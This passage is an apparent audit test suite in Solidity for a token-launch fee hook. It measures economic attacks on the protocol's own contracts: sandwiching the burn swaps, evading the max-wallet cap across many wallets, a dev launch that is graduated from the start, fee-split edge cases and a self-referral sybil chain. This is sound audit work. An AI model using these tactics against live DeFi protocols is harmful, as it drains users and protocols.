        console2.log("E-04a  gas, one sweep               :", g1);
        console2.log("E-04a  gas, ten sweeps              :", g2);

        assertLe(split, oneShot + 10, "splitting pays no more");
        assertGt(g2, g1 * 3, "and costs multiples of the gas");
    }

    /// @dev SOUND. Manufacturing your own volume to farm the bounty is strictly lossy: you pay
    ///      `feeBps` to create a pot and take 0.5% of it back.
    function test_E04b_manufacturingVolumeToFarmTheBountyIsLossy() public {
        (address t, PoolKey memory k,) = _defaultLaunch();
        _approveTrader(t, attacker);

        uint256 start = pair.balanceOf(attacker);
        _buy(k, attacker, 100e18);
        vm.prank(attacker);
        hook.sweep(k);
        _sell(k, attacker, IERC20(t).balanceOf(attacker));

        int256 pl = int256(pair.balanceOf(attacker)) - int256(start);
        console2.log("E-04b  wash-trade-for-bounty P/L    :", _p(pl));
        assertLt(pl, 0, "the bounty never repays the fee that created it");
    }

    // ============================================================================================
    // E-05  Sandwiching the sweep's own swaps
    // ============================================================================================

    /// @dev `unlockCallback` runs TWO swaps with `sqrtPriceLimitX96` pinned at the tick extreme -
    ///      i.e. **zero slippage protection**: a sell of the accumulated launch-token sell-tax at
    ///      `:799-810`, and a buyback for the burn at `:821-832`. Both are perfectly predictable
    ///      and, because `sweep` is permissionless, the attacker does not even need to front-run:
    ///      they bracket the sweep inside their own transaction.
    ///
    ///      Measured against a control where an honest stranger sweeps from the identical state.
    ///      **The result is a grief, not a theft**: the attacker's own P/L is negative, but the
    ///      burn is starved and that shortfall is permanent.
    function test_E05_sandwichingTheBurnAndTheSellConversion() public {
        Launcher.LaunchParams memory p = _baseParams();
        p.sellFeeBps = 500;
        p.burnBps = 2000;
        (address t, PoolKey memory k, PoolId id) = _launch(p);
        Distributor dist = LaunchToken(t).distributor();
        _approveTrader(t, alice);
        _approveTrader(t, bob);
        _approveTrader(t, attacker);

        // Build both piles: pair-currency fees from buys, launch-token fees from sells.
        _buy(k, alice, 30e18);
        _buy(k, bob, 30e18);
        _sell(k, bob, IERC20(t).balanceOf(bob) / 2);

        assertGt(hook.pendingFees(id), 0, "pair pile");
        assertGt(hook.pendingTokenFees(id), 0, "token pile");

        // ---- Control: honest sweep.
        uint256 snap = vm.snapshotState();
        vm.prank(carol);
        hook.sweep(k);
        uint256 burnedHonest = hook.totalBurned(id);
        uint256 holdersHonest = pair.balanceOf(address(dist));
        vm.revertToState(snap);

        // ---- Attack: buy -> sweep -> sell, all by the attacker.
        uint256 start = pair.balanceOf(attacker);
        _buy(k, attacker, 200e18);
        vm.prank(attacker);
        hook.sweep(k);
        _sell(k, attacker, IERC20(t).balanceOf(attacker));
        if (dist.withdrawableOf(attacker) != 0) {
            vm.prank(attacker);
            dist.withdraw();
        }
        int256 profit = int256(pair.balanceOf(attacker)) - int256(start);
        uint256 burnedAttacked = hook.totalBurned(id);
        uint256 holdersAttacked = pair.balanceOf(address(dist));

        console2.log("E-05   tokens burned, honest sweep  :", burnedHonest);
        console2.log("E-05   tokens burned, sandwiched    :", burnedAttacked);
        console2.log("E-05   burn shortfall (tokens)      :", burnedHonest - burnedAttacked);
        console2.log("E-05   ...as a share of the burn    :", _pct(burnedHonest - burnedAttacked, burnedHonest));
        console2.log("E-05   holders paid, honest         :", _p(int256(holdersHonest)));
        console2.log("E-05   holders paid, sandwiched     :", _p(int256(holdersAttacked)));
        console2.log("E-05   attacker P/L                 :", _p(profit));

        // The burn buys at the inflated price the attacker's front-run leg created, so fewer
        // tokens are destroyed. That shortfall is a permanent loss of the advertised deflation.
        assertLt(burnedAttacked, burnedHonest, "the sandwich starves the burn");
    }

    /// @dev The burn wedge in isolation, with the attacker's P/L attached.
    ///
    ///      A sandwich on a victim buy of size `v` in a book of pair depth `R` extracts roughly
    ///      `a*v/(2R)` for a front-run of size `a`, against a round-trip cost of `feeBps * a`. So
    ///      it only pays when `v > 2*feeBps*R`, i.e. when the victim buy is more than **6% of the
    ///      pool's pair reserve** at the default 3% fee. The burn wedge is `burnBps` of a fee pot,
    ///      which is orders of magnitude smaller than that. Measured both ways.
    function test_E05b_theBurnIsPredictableButTooSmallToBeWorthSandwiching() public {
        Launcher.LaunchParams memory p = _baseParams();
        p.burnBps = 2000;
        (address t, PoolKey memory k, PoolId id) = _launch(p);
        _approveTrader(t, attacker);
        _approveTrader(t, bob);

        for (uint256 i = 0; i < 10; ++i) {
            _buy(k, bob, 20e18);
        }
        uint256 potNow = hook.pendingFees(id);
        uint256 burnNotional = (potNow * 2000) / 10_000;
        uint256 reserve = pair.balanceOf(address(manager));

        uint256 snap = vm.snapshotState();
        vm.prank(carol);
        hook.sweep(k);
        uint256 honest = hook.totalBurned(id);
        vm.revertToState(snap);

        uint256 start = pair.balanceOf(attacker);
        _buy(k, attacker, 500e18); // the front-run leg
        vm.prank(attacker);
        hook.sweep(k);
        _sell(k, attacker, IERC20(t).balanceOf(attacker));
        int256 pl = int256(pair.balanceOf(attacker)) - int256(start);
        uint256 sandwiched = hook.totalBurned(id);

        console2.log("E-05b  pool pair reserve            :", _p(int256(reserve)));
        console2.log("E-05b  burn notional (the 'victim') :", _p(int256(burnNotional)));
        console2.log("E-05b  ...as bps of the reserve     :", (burnNotional * 10_000) / reserve);
        console2.log("E-05b  break-even needs (bps)       :", uint256(2 * 300));
        console2.log("E-05b  burned, unmolested           :", honest);
        console2.log("E-05b  burned, front-run            :", sandwiched);
        console2.log("E-05b  supply NOT destroyed         :", honest - sandwiched);
        console2.log("E-05b  SANDWICHER P/L               :", _p(pl));

        assertLt(sandwiched, honest, "front-running the burn shrinks it");
        assertLt(pl, 0, "but doing it for its own sake loses money");
        assertLt(
            (burnNotional * 10_000) / reserve, 600, "the burn is far below the sandwich break-even"
        );
    }

    // ============================================================================================
    // E-06  maxWallet
    // ============================================================================================

    /// @dev `LaunchToken._update` only checks the cap when `from == poolManager`. Wallet-to-wallet
    ///      transfers are explicitly uncapped, which is correct for a token that must not be a
    ///      honeypot - but it means the cap does not even bound the FINAL holding. Buy across N
    ///      wallets, then consolidate. Measured: the marginal cost of evasion is one ERC-20
    ///      transfer's gas per wallet.
    function test_E06_maxWalletIsBypassedByBuyingWideAndConsolidating() public {
        Launcher.LaunchParams memory p = _baseParams();
        p.maxWalletBps = 200; // "2% max wallet"
        (address t, PoolKey memory k,) = _launch(p);
        uint256 cap = LaunchToken(t).maxWallet();

        // A single buy above the cap is refused - the cap does what it says on one wallet.
        vm.expectRevert();
        _buy(k, attacker, 60e18);

        // Twelve wallets, each buying just under the cap.
        uint256 wallets = 12;
        uint256 gasSpread;
        for (uint256 i = 0; i < wallets; ++i) {
            address w = address(uint160(0x200000 + i));
            _fund(w);
            uint256 g = gasleft();
            _buyExactOut(k, w, (cap * 99) / 100);
            gasSpread += g - gasleft();
        }

        // Consolidate. Wallet-to-wallet is free, untaxed and UNCAPPED.
        uint256 gasConsolidate;
        for (uint256 i = 0; i < wallets; ++i) {
            address w = address(uint160(0x200000 + i));
            uint256 bal = IERC20(t).balanceOf(w);
            uint256 g = gasleft();
            vm.prank(w);
            IERC20(t).transfer(attacker, bal);
            gasConsolidate += g - gasleft();
        }

        uint256 finalHolding = IERC20(t).balanceOf(attacker);
        console2.log("E-06   advertised cap (bps supply)  :", _bpsOfSupply(cap));
        console2.log("E-06   final single-wallet holding  :", _bpsOfSupply(finalHolding));
        console2.log("E-06   evasion gas, buy leg         :", gasSpread);
        console2.log("E-06   evasion gas, consolidate leg :", gasConsolidate);
        console2.log("E-06   gas per extra wallet         :", (gasSpread + gasConsolidate) / wallets);

        assertGt(finalHolding, cap * 10, "one wallet ends up holding ten times the 'max wallet'");
    }

    // ============================================================================================
    // E-07  The vested dev buy
    // ============================================================================================

    /// @dev Vesting REMOVES the 10% cap (`Launcher._validate:503-510`). The worst launch that
    ///      still reads as responsible on a token page: max fee, all of it to the creator, a
    ///      "1% max wallet", and a 365-day vest over a dev buy large enough to own the float.
    ///
    ///      Two things fall out and both are measured:
    ///        1. the public float is whatever the creator left behind, and
    ///        2. the dev buy itself carries the spot price past the graduation bar INSIDE the
    ///           launch transaction, so the launch is born graduated - which is exactly the
    ///           outcome `GraduationThresholdTooLow` exists to prevent.
    function test_E07_theWorstHonestLookingLaunch() public {
        Launcher.LaunchParams memory p = _baseParams();
        p.feeBps = 1000; // the 10% ceiling
        p.sellFeeBps = 1000;
        p.creatorBps = 10_000; // every post-platform basis point
        p.maxWalletBps = 100; // "1% max wallet" for the token page
        p.graduationThreshold = M * 5; // "5x to graduate"
        p.devBuyPairAmount = 400e18; // 4x the opening market cap. Uncapped, because vested.
        p.vestDuration = 365 days;
        p.vestCliff = 30 days;

        (address t, PoolKey memory k, PoolId id) = _launch(p);
        address v = launcher.vaultOf(t);
        uint256 creatorHeld = IERC20(t).balanceOf(v);

        console2.log("E-07   creator supply (bps)         :", _bpsOfSupply(creatorHeld));
        console2.log("E-07   public float (bps)           :", 10_000 - _bpsOfSupply(creatorHeld));
        console2.log("E-07   spot mcap at launch          :", _p(int256(hook.marketCapOf(id))));
        console2.log("E-07   graduation bar               :", _p(int256(p.graduationThreshold)));
        console2.log("E-07   progress bps at launch       :", hook.graduationProgressBps(id));

        assertGt(_bpsOfSupply(creatorHeld), 7000, "the creator owns most of the supply");

        // Born graduated. Anybody may latch it in the very next transaction.
        assertGe(hook.marketCapOf(id), p.graduationThreshold, "already past the bar");
        hook.checkGraduation(id);
        assertTrue(hook.hasGraduated(id), "GRADUATED IN THE LAUNCH BLOCK");

        // And the creator is now the counterparty on both sides of a 10%/10% fee that pays them
        // 100% of everything after the platform's flat cut.
        _approveTrader(t, bob);
        // Clear the dev buy's own fee out first, so what follows measures ONLY bob's trade.
        vm.prank(carol);
        hook.sweep(k);
        uint256 creatorFeesBefore = pair.balanceOf(creator);
        uint256 bobPairBefore = pair.balanceOf(bob);
        // The 1% cap is real for a single wallet, so buy exactly under it.
        _buyExactOut(k, bob, (LaunchToken(t).maxWallet() * 99) / 100);
        uint256 bobSpent = bobPairBefore - pair.balanceOf(bob);
        vm.prank(carol);
        hook.sweep(k);
        console2.log("E-07   one capped buy costs bob     :", _p(int256(bobSpent)));
        console2.log(
            "E-07   creator's cut of that buy    :",
            _p(int256(pair.balanceOf(creator) - creatorFeesBefore))
        );
        console2.log(
            "E-07   ...as bps of bob's spend     :",
            ((pair.balanceOf(creator) - creatorFeesBefore) * 10_000) / bobSpent
        );
        assertGt(pair.balanceOf(creator), creatorFeesBefore, "and they collect the whole fee");
    }

    /// @dev The minimum lock is 7 days. Combined with an uncapped size that is the whole
    ///      protection a buyer gets in exchange for the cap being removed.
    function test_E07b_theFloorOnAnUncappedDevBuyIsSevenDays() public {
        Launcher.LaunchParams memory p = _baseParams();
        p.devBuyPairAmount = 900e18; // 9x the opening market cap -> ~90% of supply
        p.vestDuration = 7 days;
        p.vestCliff = 0;

        (address t,,) = _launch(p);
        address v = launcher.vaultOf(t);
        uint256 held = IERC20(t).balanceOf(v);
        console2.log("E-07b  supply locked for 7 days     :", _bpsOfSupply(held));

        vm.warp(block.timestamp + 7 days);
        uint256 g = gasleft();
        (bool ok,) = v.call(abi.encodeWithSignature("release()"));
        g;
        assertTrue(ok, "fully released after the minimum vest");
        assertApproxEqRel(IERC20(t).balanceOf(creator), held, 1e15, "the whole bag, one week later");
    }

    // ============================================================================================
    // E-09  The platform's flat 1%-of-volume floor swallows the whole fee at the bottom of the
    //       legal band.
    // ============================================================================================

    /// @dev `platformShareBps = PLATFORM_VOLUME_BPS * BPS / feeBps` (`FeeHook.sol:345`). At the
    ///      minimum legal `feeBps = 100` that is exactly `BPS`, so `_routeFee` sends 100% to the
    ///      platform and `rest` is ZERO - the creator and the holders receive nothing at all, no
    ///      matter what `creatorBps` says. The band decays fast: at 150 bps the holders' side is
    ///      a third of the fee, at 200 bps a half.
    function test_E09_atTheMinimumFeeTheHoldersAndCreatorGetNothing() public {
        console2.log("E-09   feeBps | platformShareBps | holders+creator get");
        uint16[5] memory fees = [uint16(100), 110, 150, 200, 300];
        for (uint256 i = 0; i < fees.length; ++i) {
            uint256 snap = vm.snapshotState();

            Launcher.LaunchParams memory p = _baseParams();
            p.feeBps = fees[i];
            p.creatorBps = 8000; // the creator ADVERTISES 80% to themselves
            (address t, PoolKey memory k,) = _launch(p);
            Distributor dist = LaunchToken(t).distributor();
            _approveTrader(t, bob);

            uint256 platBefore = pair.balanceOf(PLATFORM);
            uint256 credBefore = pair.balanceOf(creator);
            _buy(k, bob, 100e18);
            vm.prank(carol);
            hook.sweep(k);

            uint256 toPlatform = pair.balanceOf(PLATFORM) - platBefore;
            uint256 toCreator = pair.balanceOf(creator) - credBefore;
            uint256 toHolders = pair.balanceOf(address(dist));

            console2.log(
                string.concat(
                    "E-09   ",
                    vm.toString(uint256(fees[i])),
                    " | platform ",
                    _p(int256(toPlatform)),
                    " | creator ",
                    _p(int256(toCreator)),
                    " | holders ",
                    _p(int256(toHolders))
                )
            );

            if (fees[i] == 100) {
                assertEq(toCreator, 0, "at 100 bps the creator is paid nothing");
                assertEq(toHolders, 0, "and so are the holders");
                assertGt(toPlatform, 0, "the platform takes the entire fee");
            }
            vm.revertToState(snap);
        }
    }

    // ============================================================================================
    // Sound: things that were modelled and do not pay
    // ============================================================================================

    /// @dev SOUND. Wash trading can never be profitable, because the platform takes a flat 1% OF
    ///      VOLUME off the top before the creator/holder split. Even an attacker who is BOTH the
    ///      creator and effectively the entire holder base recovers strictly less than they paid.
    function test_sound_washTradingIsAlwaysLossy() public {
        Launcher.LaunchParams memory p = _baseParams();
        p.feeBps = 1000; // maximise the share that comes back
        p.creatorBps = 10_000; // ...and route all of it to the creator
        (address t, PoolKey memory k,) = _launch(p);
        _approveTrader(t, creator);

        // The creator is also the trader here: worst case for the protocol.
        pair.mint(creator, 10_000e18);
        vm.prank(creator);
        pair.approve(address(swapRouter), type(uint256).max);

        uint256 start = pair.balanceOf(creator);
        for (uint256 i = 0; i < 5; ++i) {
            _buy(k, creator, 100e18);
            vm.prank(creator);
            hook.sweep(k);
            _sell(k, creator, IERC20(t).balanceOf(creator));
            vm.prank(creator);
            hook.sweep(k);
        }
        Distributor dist = LaunchToken(t).distributor();
        if (dist.withdrawableOf(creator) != 0) {
            vm.prank(creator);
            dist.withdraw();
        }

        int256 pl = int256(pair.balanceOf(creator)) - int256(start);
        console2.log("E-SOUND wash trade P/L over 500 pair:", _p(pl));
        console2.log("E-SOUND platform take               :", _p(int256(pair.balanceOf(PLATFORM))));
        assertLt(pl, 0, "the platform's flat 1% of volume makes wash trading strictly lossy");
    }

    /// @dev SOUND. `PoolKey.fee` is ZERO and the hook keeps the entire fee, so a liquidity
    ///      provider earns nothing. That removes the whole JIT-liquidity MEV class: there is no
    ///      reason for anyone to add liquidity in front of a large swap and pull it afterwards.
    function test_sound_thereIsNoLpFeeSoThereIsNoJitMev() public {
        (address t, PoolKey memory k,) = _defaultLaunch();
        _approveTrader(t, attacker);

        // Give the JIT LP an inventory and let them add a two-sided range around the price.
        _buy(k, attacker, 100e18);
        uint256 tokens = IERC20(t).balanceOf(attacker);
        vm.prank(attacker);
        IERC20(t).approve(address(lpRouter), type(uint256).max);

        uint256 pairBefore = pair.balanceOf(attacker);
        uint256 tokBefore = IERC20(t).balanceOf(attacker);

        vm.prank(attacker);
        lpRouter.modifyLiquidity(
            k,
            ModifyLiquidityParams({
                tickLower: TickMath.minUsableTick(TICK_SPACING),
                tickUpper: TickMath.maxUsableTick(TICK_SPACING),
                liquidityDelta: int256(uint256(1e18)),
                salt: bytes32(uint256(1))
            }),
            ""
        );

        // A large trade routes through the JIT position.
        _buy(k, bob, 500e18);

        vm.prank(attacker);
        lpRouter.modifyLiquidity(
            k,
            ModifyLiquidityParams({
                tickLower: TickMath.minUsableTick(TICK_SPACING),
                tickUpper: TickMath.maxUsableTick(TICK_SPACING),
                liquidityDelta: -int256(uint256(1e18)),
                salt: bytes32(uint256(1))
            }),
            ""
        );

        // The LP is left with inventory risk and zero fee income. Everything they hold is a
        // consequence of the price having moved, not of anything they earned.
        console2.log("E-SOUND jit lp pair delta           :", _p(int256(pair.balanceOf(attacker)) - int256(pairBefore)));
        console2.log("E-SOUND jit lp token delta          :", int256(IERC20(t).balanceOf(attacker)) - int256(tokBefore));
        tokens;
        assertEq(uint24(k.fee), 0, "the pool's own fee is zero: LPs are paid nothing");
    }

    /// @dev SOUND (and load-bearing). The opening price really is a floor: there is no liquidity
    ///      below the opening tick, so no amount of selling can push the price through it. That is
    ///      what caps the sniper's downside at `feeBps` - and also what makes the sniper's option
    ///      free. It cuts both ways and is worth stating as a number.
    function test_sound_theOpeningPriceIsAHardFloor() public {
        (address t, PoolKey memory k, PoolId id) = _defaultLaunch();
        _approveTrader(t, attacker);

        uint256 openMcap = hook.marketCapOf(id);
        _buy(k, attacker, 300e18);
        _sell(k, attacker, IERC20(t).balanceOf(attacker));

        uint256 afterMcap = hook.marketCapOf(id);
        console2.log("E-SOUND opening mcap                :", _p(int256(openMcap)));
        console2.log("E-SOUND mcap after a full round trip:", _p(int256(afterMcap)));
        assertApproxEqRel(afterMcap, openMcap, 1e16, "price returns to the floor and no further");
    }
}

contract EconAuditTokenIsCurrency0Test is EconAuditCases {
    function _tokenIsCurrency0() internal pure override returns (bool) {
        return true;
    }
}

contract EconAuditTokenIsCurrency1Test is EconAuditCases {
    function _tokenIsCurrency0() internal pure override returns (bool) {
        return false;
    }
}

// ================================================================================================
// E-08  Referral sybil. Needs the platform sink to actually BE the ReferralVault, which is fixed
//       at hook-deploy time, so it gets its own world.
// ================================================================================================

contract EconReferralSybilTest is EconWorld {
    using PoolIdLibrary for PoolKey;

    function _tokenIsCurrency0() internal pure override returns (bool) {
        return true;
    }

    function _useReferralVault() internal pure override returns (bool) {
        return true;
    }

    /// @dev **`setReferrer` is write-once per USER, not per person.** A chain is established by
    ///      launching: `Launcher._configureHook` calls `setReferrer(msg.sender, p.referrer)`, and
    ///      launching is free apart from gas because the pool is seeded single-sided.
    ///
    ///      So one operator spins up six wallets, launches five throwaway tokens to wire
    ///      `W1 <- W2 <- W3 <- W4 <- W5`, and then launches the real token from a sixth wallet
    ///      naming W5. Every tier of the schedule is then occupied by the same person and
    ///      20+10+5+3+2 = 40% of the platform's cut is refunded to them, forever.
    function test_E08_aFiveDeepSelfReferralChainRefundsFortyPercentOfThePlatformCut() public {
        address[6] memory w;
        for (uint256 i = 0; i < 6; ++i) {
            w[i] = address(uint160(0x5B11000 + i));
            pair.mint(w[i], 1_000_000e18);
            vm.startPrank(w[i]);
            pair.approve(address(launcher), type(uint256).max);
            pair.approve(address(swapRouter), type(uint256).max);
            vm.stopPrank();
        }

        // Five throwaway launches to build the chain. Gas is the entire cost.
        uint256 setupGas;
        for (uint256 i = 1; i < 6; ++i) {
            Launcher.LaunchParams memory jp = _baseParams();
            jp.referrer = w[i - 1];
            uint256 g = gasleft();
            _launchAs(w[i], jp);
            setupGas += g - gasleft();
        }

        for (uint256 i = 1; i < 6; ++i) {
            assertEq(vault.referrerOf(w[i]), w[i - 1], "chain link");
        }

        // The real launch, from the sixth wallet, naming the deepest link.
        Launcher.LaunchParams memory p = _baseParams();
        p.referrer = w[5];
        uint256 gLaunch = gasleft();
        (address t, PoolKey memory k,) = _launchAs(w[0] == address(0) ? creator : creator, p);
        gLaunch = gLaunch - gasleft();
        // `creator` is the sixth wallet in this scenario; wire its referrer explicitly.
        assertEq(vault.referrerOf(creator), w[5], "creator sits on top of the chain");

        _approveTrader(t, bob);

        // 1,000 pair units of honest volume.
        uint256 volume;
        for (uint256 i = 0; i < 10; ++i) {
            _buy(k, bob, 100e18);
            volume += 100e18;
        }
        vm.prank(carol);
        hook.sweep(k);

        uint256 recovered;
        for (uint256 i = 0; i < 6; ++i) {
            recovered += vault.owed(w[i], address(pair));
        }
        uint256 toTreasury = vault.owed(TREASURY, address(pair));
        uint256 platformCut = recovered + toTreasury;

        console2.log("E-08   setup: 5 junk launches, gas  :", setupGas);
        console2.log("E-08   real launch gas              :", gLaunch);
        console2.log("E-08   honest volume                :", _p(int256(volume)));
        console2.log("E-08   platform cut on that volume  :", _p(int256(platformCut)));
        console2.log("E-08   refunded to the sybil wallets:", _p(int256(recovered)));
        console2.log("E-08   ...share of the platform cut :", _pct(recovered, platformCut));
        console2.log("E-08   ...share of traded volume    :", _pct(recovered, volume));
        console2.log("E-08   left for the treasury        :", _p(int256(toTreasury)));

        assertApproxEqRel(recovered, (platformCut * 4000) / 10_000, 2e16, "40% of the cut comes back");
        assertGt(recovered, 0, "and it is claimable");

        // ...and it really is claimable, by the same operator, from every wallet.
        for (uint256 i = 0; i < 6; ++i) {
            if (vault.owed(w[i], address(pair)) == 0) continue;
            vm.prank(w[i]);
            vault.claim(address(pair));
        }
    }

    /// @dev SOUND-ish, and worth pinning: the schedule cannot be deepened, the walk is bounded by
    ///      `tierCount`, and a chain cannot loop back on itself because `referrerOf` is write-once
    ///      and a referrer must already exist before they can refer. So the sybil recovers a FIXED
    ///      40% and cannot compound it by making the chain longer.
    function test_E08b_theSybilCannotDeepenTheChainBeyondFiveTiers() public {
        address[9] memory w;
        for (uint256 i = 0; i < 9; ++i) {
            w[i] = address(uint160(0x5C22000 + i));
            pair.mint(w[i], 1_000_000e18);
            vm.startPrank(w[i]);
            pair.approve(address(launcher), type(uint256).max);
            vm.stopPrank();
        }
        for (uint256 i = 1; i < 9; ++i) {
            Launcher.LaunchParams memory jp = _baseParams();
            jp.referrer = w[i - 1];
            _launchAs(w[i], jp);
        }

        Launcher.LaunchParams memory p = _baseParams();
        p.referrer = w[8];
        (address t, PoolKey memory k,) = _launch(p);
        _approveTrader(t, bob);
        _buy(k, bob, 500e18);
        vm.prank(carol);
        hook.sweep(k);

        uint256 paidTiers;
        for (uint256 i = 0; i < 9; ++i) {
            if (vault.owed(w[i], address(pair)) != 0) paidTiers++;
        }
        console2.log("E-08b  wallets paid out of 9         :", paidTiers);
        assertEq(paidTiers, 5, "MAX_TIERS is a hard cap in the bytecode");
    }
}
